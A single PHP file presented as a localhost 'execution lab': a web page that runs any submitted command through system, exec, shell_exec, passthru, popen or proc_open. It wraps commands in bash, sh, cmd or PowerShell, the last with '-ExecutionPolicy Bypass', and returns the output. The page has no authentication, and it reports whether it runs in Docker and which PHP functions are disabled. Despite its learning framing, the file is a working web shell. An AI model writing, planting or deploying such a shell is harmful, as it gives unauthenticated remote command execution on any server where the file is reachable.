<?php
/*
  Interactive Execution Lab with Docker & OS detection
  Run on localhost ONLY!
*/

function isDocker() {
    if (file_exists('/.dockerenv')) return true;
    if (is_readable('/proc/1/cgroup')) {
        $cgroup = file_get_contents('/proc/1/cgroup');
        if (strpos($cgroup, 'docker') !== false || strpos($cgroup, 'kubepods') !== false) {
            return true;
        }
    }
    $mounts = shell_exec('mount 2>/dev/null');
    if (strpos($mounts, 'overlay') !== false) return true;
    return false;
}

function outputBox($content) {
    // Color green for success output; red for errors if detected (simple)
    $color = "lime";
    $lower = strtolower($content);
    if (strpos($lower, 'error') !== false || strpos($lower, 'failed') !== false) {
        $color = "red";
    }
    // Preserve basic terminal style & color
    $content = htmlspecialchars($content);
    $content = preg_replace('/\e\[[\d;]*m/', '', $content); // Remove escape sequences if any

    echo "<pre style='
        background: black;
        color: $color;
        font-family: monospace;
        padding: 15px;
        height: 300px;
        overflow-y: auto;
        border-radius: 8px;
        white-space: pre-wrap;
        word-break: break-word;
    '>$content</pre>";
}

$currentOS = PHP_OS_FAMILY;
$dockerStatus = isDocker() ? "Yes" : "No";
$disabledFunctions = ini_get("disable_functions");
$disabledList = $disabledFunctions ? explode(',', $disabledFunctions) : [];

$methods = ['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'];
$shells = ['bash', 'sh', 'cmd', 'powershell'];

$executionResult = '';
$errorMsg = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $method = $_POST['method'] ?? '';
    $shell = $_POST['shell'] ?? '';
    $cmd = $_POST['cmd'] ?? '';

    // Validate inputs:
    if (!in_array($method, $methods)) {
        $errorMsg = "Invalid execution method.";
    }
    if (!in_array($shell, $shells)) {
        $errorMsg = "Invalid shell selection.";
    }
    if (trim($cmd) === '') {
        $errorMsg = "Command cannot be empty.";
    }

    // Check disabled functions
    if (!$errorMsg && in_array($method, $disabledList)) {
        $errorMsg = "Function <b>$method()</b> is disabled in PHP.";
    }

    if (!$errorMsg) {
        // Wrap command according to shell
    switch ($shell) {
    case "cmd":
        $cmdPath = getenv('COMSPEC') ?: 'C:\\Windows\\System32\\cmd.exe';
        $wrappedCmd = "\"$cmdPath\" /c \"chcp 65001 >nul & " . str_replace('"', '""', $cmd) . "\"";
        break;

    case "powershell":
	    // Absolute path to 64-bit PowerShell
	    $psPath = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe';
	    
	    // Escape single quotes in user command
	    $escapedCmd = str_replace("'", "''", $cmd);
	    
	    // Build final command with flags and stderr capture
	    $wrappedCmd = "\"$psPath\" -NoProfile -ExecutionPolicy Bypass -Command '$escapedCmd' 2>&1";
	    break;
    
    // Linux shells unchanged:
    case "bash":
        $wrappedCmd = "bash -c \"$cmd\"";
        break;
    case "sh":
        $wrappedCmd = "sh -c \"$cmd\"";
        break;
}

        // Execute based on method
        try {
            switch ($method) {
                case "system":
                    ob_start();
                    system($wrappedCmd);
                    $executionResult = ob_get_clean();
                    break;

                case "exec":
                    $output = [];
                    exec($wrappedCmd . " 2>&1", $output);
                    $executionResult = implode("\n", $output);
                    break;

                case "shell_exec":
                    $executionResult = shell_exec($wrappedCmd . " 2>&1");
                    break;

                case "passthru":
                    ob_start();
                    passthru($wrappedCmd);
                    $executionResult = ob_get_clean();
                    break;

                case "popen":
                    $handle = popen($wrappedCmd . " 2>&1", "r");
                    $executionResult = stream_get_contents($handle);
                    pclose($handle);
                    break;

                case "proc_open":
                    $descriptorspec = [
                        0 => ["pipe", "r"],
                        1 => ["pipe", "w"],
                        2 => ["pipe", "w"]
                    ];
                    $process = proc_open($wrappedCmd, $descriptorspec, $pipes);
                    if (is_resource($process)) {
                        $stdout = stream_get_contents($pipes[1]);
                        $stderr = stream_get_contents($pipes[2]);
                        fclose($pipes[1]);
                        fclose($pipes[2]);
                        proc_close($process);
                        $executionResult = $stdout . $stderr;
                    } else {
                        $executionResult = "proc_open failed to start process.";
                    }
                    break;
                default:
                    $executionResult = "Unsupported method.";
            }
        } catch (Throwable $e) {
            $executionResult = "Exception: " . $e->getMessage();
        }
    }
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>PHP Execution Lab - Interactive Terminal</title>
<style>
    body {
        background: #1e1e2f;
        color: #c9d1d9;
        font-family: 'Consolas', 'Courier New', monospace;
        margin: 0; padding: 20px;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
        align-items: center;
    }
    h1 {
        margin-bottom: 5px;
        color: #6ee7b7;
    }
    .info {
        margin-bottom: 15px;
        font-size: 0.9rem;
    }
    .lab-container {
        width: 100%;
        max-width: 900px;
        background: #282c34;
        border-radius: 10px;
        padding: 20px;
        box-shadow: 0 0 12px #4caf50aa;
    }
    label {
        display: block;
        margin: 10px 0 5px;
        font-weight: 600;
    }
    select, input[type=text] {
        width: 100%;
        padding: 10px 12px;
        border-radius: 6px;
        border: none;
        font-family: monospace;
        font-size: 1rem;
        background: #121622;
        color: #c9d1d9;
        box-sizing: border-box;
    }
    select:focus, input[type=text]:focus {
        outline: none;
        box-shadow: 0 0 5px #4caf50;
    }
    button {
        margin-top: 20px;
        background: #4caf50;
        border: none;
        padding: 12px 20px;
        border-radius: 6px;
        font-weight: 700;
        color: #121622;
        cursor: pointer;
        font-size: 1rem;
        transition: background 0.3s ease;
        width: 100%;
    }
    button:hover {
        background: #3a9d3a;
    }
    .terminal-output {
        margin-top: 25px;
    }
    pre {
        background: black;
        color: lime;
        padding: 15px;
        border-radius: 8px;
        height: 350px;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-word;
        font-size: 1rem;
    }
    .error {
        color: #f87171;
        margin-top: 10px;
        font-weight: 700;
    }
    .footer {
        margin-top: auto;
        font-size: 0.8rem;
        color: #666;
        text-align: center;
        padding: 15px 0 5px;
        width: 100%;
    }
</style>
</head>
<body>

<div class="lab-container">
    <h1>⚡ PHP Execution Lab - Interactive Terminal</h1>

    <div class="info">
        <strong>Detected OS:</strong> <?=htmlspecialchars($currentOS)?> &nbsp;&nbsp;|&nbsp;&nbsp;
        <strong>Docker:</strong> <?=htmlspecialchars($dockerStatus)?> &nbsp;&nbsp;|&nbsp;&nbsp;
        <strong>Disabled Functions:</strong>
        <?php if (empty($disabledList)): ?>
            None
        <?php else: ?>
            <?=htmlspecialchars(implode(', ', $disabledList))?>
        <?php endif; ?>
    </div>

    <form method="POST" autocomplete="off" spellcheck="false">

        <label for="method">Select Execution Method:</label>
        <select name="method" id="method" required>
            <?php foreach ($methods as $m): ?>
                <option value="<?=$m?>" <?= (isset($_POST['method']) && $_POST['method']===$m) ? 'selected' : '' ?>><?=$m?>()</option>
            <?php endforeach; ?>
        </select>

        <label for="shell">Select Shell:</label>
        <select name="shell" id="shell" required>
            <?php foreach ($shells as $sh): ?>
                <option value="<?=$sh?>" <?= (isset($_POST['shell']) && $_POST['shell']===$sh) ? 'selected' : '' ?>>
                    <?=ucfirst($sh)?>
                </option>
            <?php endforeach; ?>
        </select>

        <label for="cmd">Enter Command:</label>
        <input
            type="text"
            id="cmd"
            name="cmd"
            placeholder="e.g. whoami, dir, ipconfig, ls -la"
            value="<?=htmlspecialchars($_POST['cmd'] ?? '')?>"
            required
            autofocus
        />

        <button type="submit">Execute</button>
    </form>

    <div class="terminal-output">
        <?php if ($errorMsg): ?>
            <div class="error"><?= $errorMsg ?></div>
        <?php elseif ($executionResult !== ''): ?>
            <?php outputBox($executionResult) ?>
        <?php else: ?>
            <pre style="color: #888;">Terminal ready for input...</pre>
        <?php endif; ?>
    </div>
</div>

<div class="footer">
    PHP Execution Lab • Run only on localhost • Developed for learning
</div>

</body>
</html>
